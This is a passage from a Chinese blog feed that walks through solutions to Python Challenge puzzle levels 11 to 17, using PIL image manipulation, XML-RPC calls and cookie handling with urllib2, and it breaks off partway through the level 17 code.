<h3 id="python_challenge_21"><a href="">python challenge 21</a></h3><p><code>invader.zip</code><br><figure class]]>
    </summary>
    
      <category term="challenge" scheme="http://blog.idhyt.com/tags/challenge/"/>
    
      <category term="python" scheme="http://blog.idhyt.com/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python challenge 11-20]]></title>
    <link href="http://blog.idhyt.com/2015/08/10/python-challenge-11-20/"/>
    <id>http://blog.idhyt.com/2015/08/10/python-challenge-11-20/</id>
    <published>2015-08-10T09:34:11.000Z</published>
    <updated>2015-12-31T12:07:34.000Z</updated>
    <content type="html"><![CDATA[<p>接上边继续斗智斗勇中。越来越觉得智商不够用了。。</p>
<h3 id="python_challenge_11"><a href="http://www.pythonchallenge.com/pc/return/5808.html" target="_blank" rel="external">python challenge 11</a></h3><p><code>http://www.pythonchallenge.com/pc/return/5808.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-11.jpg" alt="11"><br>题目只有一张模糊的图片，源码也没什么提示，看页面title为odd even.<br>猜测这张模糊的图片是否是将两张图片合成的，因此将其奇偶坐标分离开.<br>分离坐标有四种情况，(odd, odd),(odd, even),(even, odd),(even, even).<br>我这里取双奇偶坐标(odd, odd)和(even, even).<br>在PIL库中，使用load函数的效果比使用putpixel和getpixel更高效，因此选择使用load函数.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd_even</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    im = Image.open(<span class="string">"img/python-challenge-11.jpg"</span>)</span><br><span class="line">    w, h = im.size</span><br><span class="line"></span><br><span class="line">    imgs = [Image.new(im.mode, (w / <span class="number">2</span>, h / <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>)]</span><br><span class="line">    imgs_load = [img.load() <span class="keyword">for</span> img <span class="keyword">in</span> imgs]</span><br><span class="line">    org = im.load()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(w):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(h):</span><br><span class="line">            <span class="keyword">if</span> (i + j) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                org_pos = (i, j)</span><br><span class="line">                new_pos = (i / <span class="number">2</span>, j / <span class="number">2</span>)</span><br><span class="line">                imgs_load[i % <span class="number">2</span>][new_pos] = org[org_pos]</span><br><span class="line"></span><br><span class="line">    [imgs[i].save(<span class="string">'img/python-challenge-11-%d.jpg'</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>)]</span><br></pre></td></tr></table></figure></p>
<p>最后生成的两张图片是一样的<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-11-evil.jpg" alt="11-evil"><br>显示的单词evil即为答案。</p>
<h3 id="python_challenge_12"><a href="http://www.pythonchallenge.com/pc/return/evil.html" target="_blank" rel="external">python challenge 12</a></h3><p><code>http://www.pythonchallenge.com/pc/return/evil.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-12.jpg" alt="12"><br>一张没有什么异常的图片，查看下源码，注意看图片名字，evil1.jpg，这里应该尝试下evil2.jpg了。<br>evil2.jpg -&gt; not jpg –gfx<br>evil3.jpg -&gt; no more evils…<br>evil4.jpg -&gt; Bert is evil! go back!(只在ie中可看到)<br>根据这些提示，先将evil2.jpg改为evil2.gfx，得到这个文件<br>GFX文件格式：GFX是一套跨平台的图形生成包，是一种可用于交互的图形格式，详情百度下。<br>到这里就没有思路了，看了下提示才知道，原来原图那人把扑克牌分成5堆，要把那个gfx文件用分牌的方式分成5个文件。<br>gfx的第一个字节给第一个文件，第二个字节给第二个文件，第三个字节给第三个文件，第四个字节给第四个文件，第五个字节给第五个文件，第六个字节给第一个文件……<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evil</span><span class="params">()</span>:</span></span><br><span class="line">    f = open(<span class="string">'files/evil2.gfx'</span>, <span class="string">'rb+'</span>)</span><br><span class="line">    content = f.read()</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">        f = open(<span class="string">'files/evil2-%d.jpg'</span> % i, <span class="string">'wb+'</span>)</span><br><span class="line">        f.write(content[i::<span class="number">5</span>])</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure></p>
<p>最后得到5张图片连接起来即为结果:disproportional<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-12-evil2.jpg" alt="12-evil2"></p>
<h3 id="python_challenge_13"><a href="http://www.pythonchallenge.com/pc/return/disproportional.html" target="_blank" rel="external">python challenge 13</a></h3><p><code>http://www.pythonchallenge.com/pc/return/disproportional.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-13.jpg" alt="13"><br>这个页面显示了一个电话按键，并且标题为call him，很明显是要拨打一个电话号码。<br>图片最下边提示phone that evil，再回头看那个evil4.jpg的提示，Bert is evil! go back!<br>所以是要打电话给Bert,怎么打，不可能用自己手机打吧！然后在页面到处点点，一不小心点到了5就进去了。<br>进入页面：<a href="http://www.pythonchallenge.com/pc/phonebook.php" target="_blank" rel="external">http://www.pythonchallenge.com/pc/phonebook.php</a><br>这是什么鬼，止步于此，开始度娘。。。<br>xmlrpc是使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据blablabla…<br>反正就是要用到python的<a href="https://docs.python.org/2/library/xmlrpclib.html" target="_blank" rel="external">xmlrpclib模块</a>来连接这个php页面，然后查看其方法，其中有个名为phone方法就是答案。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disproportional</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> xmlrpclib</span><br><span class="line">    xml_rpc = xmlrpclib.ServerProxy(<span class="string">"http://www.pythonchallenge.com/pc/phonebook.php"</span>)</span><br><span class="line">    <span class="keyword">print</span> xml_rpc.system.listMethods()</span><br><span class="line">    <span class="keyword">print</span> xml_rpc.system.methodHelp(<span class="string">'phone'</span>)</span><br><span class="line">    <span class="keyword">print</span> xml_rpc.phone(<span class="string">'Bert'</span>)</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>[<span class="string">'phone'</span>, <span class="string">'system.listMethods'</span>, <span class="string">'system.methodHelp'</span>, <span class="string">'system.methodSignature'</span>, <span class="string">'system.multicall'</span>, <span class="string">'system.getCapabilities'</span>]</span><br><span class="line">    Returns the phone of a person</span><br><span class="line">    <span class="number">555</span>-ITALY</span><br></pre></td></tr></table></figure></p>
<p>最后输入555-ITALY.html不行。。改为ITALY.html提示SMALL letters。。好吧。。italy.html</p>
<h3 id="python_challenge_14"><a href="http://www.pythonchallenge.com/pc/return/italy.html" target="_blank" rel="external">python challenge 14</a></h3><p><code>http://www.pythonchallenge.com/pc/return/italy.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-14.jpg" alt="14"><br>所有提示信息：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据网页标题的提示：walk around</span><br><span class="line">网页源码的提示：<span class="number">100</span>*<span class="number">100</span> = (<span class="number">100</span>+<span class="number">99</span>+<span class="number">99</span>+<span class="number">98</span>) + (...</span><br><span class="line">下边那张图wire.png点开标题为<span class="number">10000</span>*<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>先验证序列公式<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 100*100 = (100+99+99+98) + (...</span></span><br><span class="line">items = [i + i-<span class="number">1</span> + i-<span class="number">1</span> + i-<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">100</span>, <span class="number">1</span>, -<span class="number">2</span>)]</span><br><span class="line">items_value = reduce(<span class="keyword">lambda</span> x, y: x+y, items)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%d %d"</span> % (len(items), items_value)</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span><span class="number">50</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure></p>
<p>可知该序列公式是正确的。<br>10000x1 = 100x100是否要重新组图，按照这个思路把10000个像素重组<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">org_img = Image.open(<span class="string">'img/wire.png'</span>)</span><br><span class="line">org_data = list(org_img.getdata())</span><br><span class="line">res_img = Image.new(org_img.mode, (<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line">res_data = res_img.load()</span><br><span class="line">org_index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">100</span>):</span><br><span class="line">        res_data[j, i] = org_data[org_index]</span><br><span class="line">        org_index += <span class="number">1</span></span><br><span class="line">res_img.save(<span class="string">"img/wire-0.png"</span>)</span><br></pre></td></tr></table></figure></p>
<p>最开始是按照先行后列的方式重组发现图片是反的，然后按照先列后行的方式重组，得到一个图片。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-14-bit.png" alt="14-bit"><br>万分欣喜，进入bit.html页面就傻了：you took the wrong curve.<br>真是个悲伤的故事。。。<br>下边就完全没有任何头绪，只要又要借助度娘了，最后得到的解题思路是：<br>将10000x1的那张图片按照序列化的格式进行重新生成100x100的图片，生成的逻辑是：<br>按照图片面包的方向，从右边开始，外向内绕圈圈，<br>先向一个方向走100个像素，然后转90度，走99个像素，再转90度，再走99个像素，再转90度，再走98个像素，这样就完成了一个圈。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">italy</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    <span class="comment"># 100*100 ＝ （100 + 99 + 99 + 98)+(...</span></span><br><span class="line">    items = [[i, i-<span class="number">1</span>, i-<span class="number">1</span>, i-<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">100</span>, <span class="number">1</span>, -<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    org_img = Image.open(<span class="string">'img/wire.png'</span>)</span><br><span class="line">    org_data = list(org_img.getdata())</span><br><span class="line">    new_img = Image.new(org_img.mode, (<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line">    new_data = new_img.load()</span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(item[<span class="number">0</span>]):</span><br><span class="line">            new_data[x, y] = org_data[index]</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        x -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(item[<span class="number">1</span>]):</span><br><span class="line">            new_data[x, y] = org_data[index]</span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        y -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(item[<span class="number">2</span>]):</span><br><span class="line">            new_data[x, y] = org_data[index]</span><br><span class="line">            x -= <span class="number">1</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(item[<span class="number">3</span>]):</span><br><span class="line">            new_data[x, y] = org_data[index]</span><br><span class="line">            y -= <span class="number">1</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        y += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    new_img.save(<span class="string">'img/wire-cat.png'</span>)</span><br></pre></td></tr></table></figure></p>
<p>最后得到了一张图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-14-cat.png" alt="14-cat"><br>然后输入cat.html进入页面，出现了两只猫的图片，并有一段说明：<br>and its name is uzi. you’ll hear from him later.<br>替换为uzi.html进入下一题，uzi不是小狗吗 = =!</p>
<h3 id="python_challenge_15"><a href="http://www.pythonchallenge.com/pc/return/uzi.html" target="_blank" rel="external">python challenge 15</a></h3><p><code>http://www.pythonchallenge.com/pc/return/uzi.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-15.jpg" alt="15"></p>
<p>先找到所有有用的提示：</p>
<ul>
<li>图片信息<br>1**6年1月26日<br>右下角2月份有29天 说明是闰年 且2月29日为周日</li>
<li>页面标题<br>whom 猜测应该是找人</li>
<li><p>网页源码<br>he ain’t the youngest, he is the second # 应该是找到一个年龄列表中第二年轻的<br>buy flowers for tomorrow # 结合1月26日应该是说明天即1月27日有事件发生</p>
</li>
<li><p>结合以上信息<br>应该是找到1**6年中的所有闰年，且2月29日为周一的时间中第二个年轻的年份，<br>然后加上1月27日得到一个事件时间，这个时间和一个人有关系。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># run in python 3.0+</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uzi</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_week_day</span><span class="params">(year_, mouth_, day_)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> datetime(year_, mouth_, day_).strftime(<span class="string">"%w"</span>)</span><br><span class="line"></span><br><span class="line">    leap_years = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1006</span>, <span class="number">1997</span>, <span class="number">10</span>) <span class="keyword">if</span> (i % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">100</span> != <span class="number">0</span>) <span class="keyword">or</span> i % <span class="number">400</span> == <span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print (leap_years)</span></span><br><span class="line">    match_year = [y <span class="keyword">for</span> y <span class="keyword">in</span> leap_years <span class="keyword">if</span> get_week_day(y, <span class="number">2</span>, <span class="number">29</span>) == <span class="string">"0"</span>]</span><br><span class="line">    <span class="keyword">print</span> (match_year)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"%d-01-17"</span> % match_year[-<span class="number">2</span>])</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>[<span class="number">1176</span>, <span class="number">1356</span>, <span class="number">1576</span>, <span class="number">1756</span>, <span class="number">1976</span>]</span><br><span class="line">    <span class="number">1756</span>-<span class="number">01</span>-<span class="number">17</span></span><br></pre></td></tr></table></figure>
<p>由于python2.7版本中the datetime strftime() methods require year &gt;= 1900,<br>因此该代码需要运行在python3.0+<br>最后百度关键词1756年1月27日，著名的音乐大师沃尔弗于格·莫扎特(mozart),诞生于奥地利查尔茨堡。<br>诞生于，诞生啊。。其实最初我以为送花是第二天有人挂掉了去拜祭。。面壁思过中。。。</p>
<h3 id="python_challenge_16"><a href="http://www.pythonchallenge.com/pc/return/mozart.html" target="_blank" rel="external">python challenge 16</a></h3><p><code>http://www.pythonchallenge.com/pc/return/mozart.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-16.gif" alt="16"><br>页面标题提示：let me get this straight<br>观察图片将粉色的线条对齐排成一列，即将每行像素点循环左移知道粉色点位于最左边。<br>其中图片模式为索引像素模式，用ps查看得到粉色Idx=195,对应RGB=(255, 0, 255)。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mozart</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    org_img = Image.open(<span class="string">'img/mozart.gif'</span>)</span><br><span class="line">    org_size = org_img.size</span><br><span class="line">    org_data = list(org_img.getdata())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># new_img = Image.new(org_img.mode, org_size)</span></span><br><span class="line">    new_img = org_img.copy()</span><br><span class="line">    new_data = new_img.load()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(org_size[<span class="number">1</span>]):</span><br><span class="line">        line_pixels = org_data[org_size[<span class="number">0</span>] * y: org_size[<span class="number">0</span>] * (y + <span class="number">1</span>)]</span><br><span class="line">        pink_index = line_pixels.index(<span class="number">195</span>)</span><br><span class="line">        <span class="keyword">for</span> x, pixel <span class="keyword">in</span> enumerate(line_pixels[pink_index:] + line_pixels[:pink_index]):</span><br><span class="line">            new_data[x, y] = pixel</span><br><span class="line"></span><br><span class="line">    new_img.save(<span class="string">"img/romance.gif"</span>)</span><br></pre></td></tr></table></figure></p>
<p>最后生成答案图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-16-romance.gif" alt="16-romance"></p>
<h3 id="python_challenge_17"><a href="http://www.pythonchallenge.com/pc/return/romance.html" target="_blank" rel="external">python challenge 17</a></h3><p><code>http://www.pythonchallenge.com/pc/return/romance.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-17.jpg" alt="17"><br>做这个题请自觉开启自虐模式，不要问我为什么，我只想静静。<br>页面标题：eat? 看下源代码图片名字为cookies.jpg<br>cookies点心？cookie?打开chrome控制台输入alert(document.cookie)<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-17-alert.jpg" alt="17-alert"><br>you should have followed busynothing…<br>结合图片左下角linkedlist页面的图片，想到之前遍历时候找的每个页面，这个应该是遍历找每个页面的cookie信息了。<br>初步验证，先进入linkedlist的第一个节点：<br><a href="http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=12345" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=12345</a><br>页面内容：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">If you came here <span class="keyword">from</span> level <span class="number">4</span> - go back!</span><br><span class="line">You should follow the obvious chain...</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> the next busynothing <span class="keyword">is</span> <span class="number">44827</span></span><br></pre></td></tr></table></figure></p>
<p>大概意思是说这个界面如果你是从第四关跳进去的话请返回,显示的关键字会是nothing而非busynothing。<br>因此一定要从第一个节点进入，不要从linkedlist.php点击图片进入，否则获取不到cookie信息。<br>弹出的cookie信息为：info=B<br>第二个节点：<a href="http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=44827" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=44827</a><br>弹出的cookie信息为：info=Z<br>是不是有点眼熟，回头找找第8关的BZ2压缩。。<br>之后是写代码之路，其中cookie模块参考：<a href="http://my.oschina.net/duhaizhang/blog/69342" target="_blank" rel="external">urllib2模块、cookielib模块</a><br>遍历完cookie信息后得到字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BZh91AY%<span class="number">26</span>SY%<span class="number">94</span>%<span class="number">3</span>A%E2I%<span class="number">00</span>%<span class="number">00</span>%<span class="number">21</span>%<span class="number">19</span>%<span class="number">80</span>P%<span class="number">81</span>%<span class="number">11</span>%<span class="number">00</span>%AFg%<span class="number">9</span>E%A0+%<span class="number">00</span>hE%<span class="number">3</span>DM%B5%<span class="number">23</span>%D0%D4%D1%E2%<span class="number">8</span>D%<span class="number">06</span>%A9%FA%<span class="number">26</span>S%D4%D3%<span class="number">21</span>%A1%EAi7h%<span class="number">9</span>B%<span class="number">9</span>A%<span class="number">2</span>B%BF%<span class="number">60</span>%<span class="number">22</span>%C5WX%E1%ADL%<span class="number">80</span>%E8V%<span class="number">3</span>C%C6%A8%DBH%<span class="number">2632</span>%<span class="number">18</span>%A8x%<span class="number">01</span>%<span class="number">08</span>%<span class="number">21</span>%<span class="number">8</span>DS%<span class="number">0</span>B%C8%AF%<span class="number">96</span>KO%CA2%B0%F1%BD%<span class="number">1</span>Du%A0%<span class="number">86</span>%<span class="number">05</span>%<span class="number">92</span>s%B0%<span class="number">92</span>%C4Bc%F1w%<span class="number">24</span>S%<span class="number">85</span>%<span class="number">09</span>%<span class="number">09</span>C%AE%<span class="number">24</span></span><br></pre></td></tr></table></figure></p>
<p>看看格式应该是转义过的，调用urllib转义函数得到结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BZh91AY&amp;SY\x94:\xe2I\x00\x00!\x19\x80P\x81\x11\x00\xafg\x9e\xa0 \x00hE=M\xb5<span class="comment">#\xd0\xd4\xd1\xe2\x8d\x06\xa9\xfa&amp;S\xd4\xd3!\xa1\xeai7h\x9b\x9a+\xbf`"\xc5WX\xe1\xadL\x80\xe8V&lt;\xc6\xa8\xdbH&amp;32\x18\xa8x\x01\x08!\x8dS\x0b\xc8\xaf\x96KO\xca2\xb0\xf1\xbd\x1du\xa0\x86\x05\x92s\xb0\x92\xc4Bc\xf1w$S\x85\t\tC\xae$\x90</span></span><br></pre></td></tr></table></figure></p>
<p>这个看着就很熟悉了，调用bz2进行解压<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is it the 26th already? call his father and inform him that "the flowers are on their way". he'll understand.</span><br></pre></td></tr></table></figure></p>
<p>这个结果看的也是格外的忧伤，竟然还有这么多的坑。。看看26th说的是莫扎特，查下莫扎特的老爹为Leopold。<br>试试Leopold.html,404啊，404！！！<br>再仔细看，call his father，打电话，电话！！！<br>调用13关的代码Bert改为Leopold返回555-VIOLIN<br>参考13关去数字改小写地址为violin.html，竟然还有，呵呵哒。。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no! i mean yes! but ../stuff/violin.php.</span><br></pre></td></tr></table></figure></p>
<p>再改将上级目录改为/stuff/violin.php<br>即<a href="http://www.pythonchallenge.com/pc/stuff/violin.php" target="_blank" rel="external">http://www.pythonchallenge.com/pc/stuff/violin.php</a><br>看到图片我以为终于完了，仔细一看，编号呢，没编号肯定还是个坑啊，我内心几乎是崩溃的。。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-17-violin.jpg" alt="17-violin"></p>
<p>看下页面提示标题：it’s me. what do you want?<br>返回页面也没有什么其他信息，答案在哪里？！？！？<br>想想这个题主题是cookie,回头再看上边的解压出来的提示信息，后半句还没有用到。<br>inform him that “the flowers are on their way”<br>翻译是告诉他鲜花已经来路上，暗示要给他携带信息。<br>也就是说要带上info=”the flowers are on their way”消息去访问这个页面！<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cj._cookies.values()[<span class="number">0</span>][<span class="string">'/'</span>][<span class="string">'info'</span>].value = <span class="string">'the+flowers+are+on+their+way'</span></span><br><span class="line">violin_source = opener.open(<span class="string">'http://www.pythonchallenge.com/pc/stuff/violin.php'</span>).read()</span><br><span class="line"><span class="keyword">print</span> violin_source</span><br></pre></td></tr></table></figure></p>
<p>打印出来的页面：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;it's me. what do you want?&lt;/title&gt;</span><br><span class="line">  &lt;link rel="stylesheet" type="text/css" href="../style.css"&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;center&gt;&lt;font color="gold"&gt;</span><br><span class="line">    &lt;img src="leopold.jpg" border="0"/&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">oh well, don't you dare to forget the balloons.&lt;/font&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>终于出结果了，balloons，感觉已经可以开始google大法了QAQ。。</p>
<p>完整逻辑代码，其中略掉level13的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">romance</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> urllib2</span><br><span class="line">    <span class="keyword">import</span> cookielib</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">    cj = cookielib.CookieJar()</span><br><span class="line">    handler = urllib2.HTTPCookieProcessor(cj)</span><br><span class="line">    opener = urllib2.build_opener(handler)</span><br><span class="line"></span><br><span class="line">    base_url = <span class="string">"http://www.pythonchallenge.com/pc/def/linkedlist.php"</span></span><br><span class="line">    param = <span class="string">"12345"</span></span><br><span class="line">    times = <span class="number">1</span></span><br><span class="line">    info = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"?busynothing="</span>.join([base_url, param])</span><br><span class="line">            page_source = 